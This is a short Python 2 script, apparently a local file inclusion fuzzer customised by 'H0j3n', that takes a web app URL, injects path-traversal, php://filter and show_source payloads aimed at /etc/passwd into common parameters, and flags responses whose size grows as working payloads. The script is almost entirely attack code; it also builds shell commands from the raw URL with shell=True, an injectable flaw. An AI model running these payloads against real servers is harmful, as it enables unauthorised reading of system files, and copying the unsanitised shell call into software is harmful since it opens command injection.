# !/usr/bin/python
# coding=utf-8

import requests, sys, urllib, re, os, subprocess,time
from subprocess import Popen, PIPE
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def header():
	SIG = formatHelp2('''
	 ██▓███   ▄▄▄       ██▀███  ▄▄▄      ███▄ ▄███▓ ██▓      █████▒██▓
	▓██░  ██▒▒████▄    ▓██ ▒ ██▒████▄   ▓██▒▀█▀ ██▒▓██▒    ▓██   ▒▓██▒
	▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒██  ▀█▄ ▓██    ▓██░▒██░    ▒████ ░▒██▒
	▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄ ░██▄▄▄▄██▒██    ▒██ ▒██░    ░▓█▒  ░░██░
	▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒▓█   ▓██▒██▒   ░██▒░██████▒░▒█░   ░██░
	▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒░   ░  ░░ ▒░▓  ░ ▒ ░   ░▓  
	░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░ ▒   ▒▒ ░  ░      ░░ ░ ▒  ░ ░      ▒ ░
	░░         ░   ▒     ░░   ░  ░   ▒  ░      ░     ░ ░    ░ ░    ▒ ░
		       ░  ░   ░          ░  ░      ░       ░  ░        ░  
		                            	      [Customize by H0j3n]             
	''')
    	return SIG

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def formatHelp2(STRING):
    return Style.BRIGHT+Fore.GREEN+STRING+Fore.RESET

def formatHelp3(STRING):
    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET

if __name__ == "__main__":
	print header();
	if len(sys.argv) != 2:
		print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
		print formatHelp("(+) Example:\t python %s 'http://10.10.10.10/thankyou'" % sys.argv[0])
		sys.exit(-1)
	SERVER_URL = sys.argv[1]
	if ("http" in SERVER_URL) or ("https" in SERVER_URL):
		LIST_PARAM = ["file","page","id","image","include"]
		LIST_LFI = ["../../../../../../../../../../etc/passwd","php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd","' and die(show_source('/etc/passwd')) or '"]
		cmd = "curl -s " + SERVER_URL + " | wc -m"
		ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		original = ps.communicate()[0]
		print formatHelp2("[+] Original Size : " + str(original))
		COUNTWORK = 0
		for i in LIST_PARAM:
			for j in LIST_LFI:
				time.sleep(1)
				tmpcmd = "curl -s " + SERVER_URL + "?" + i + "=" + j + " | wc -m"
				ps2 = subprocess.Popen(tmpcmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
				tmpresult = ps2.communicate()[0]
				
				print "[+] TEST #" + str(COUNTWORK)
				if tmpresult > original:
					print formatHelp2("[+] Possible Working! : " + str(tmpresult))
					print formatHelp3("PAYLOAD -> " + SERVER_URL + "?" + i + "=" + j)
					print "\n"
				else:
					print formatHelp("[+] Not Working! : " + str(tmpresult))
				COUNTWORK += 1
				
	else:
		sys.exit(-1)
	

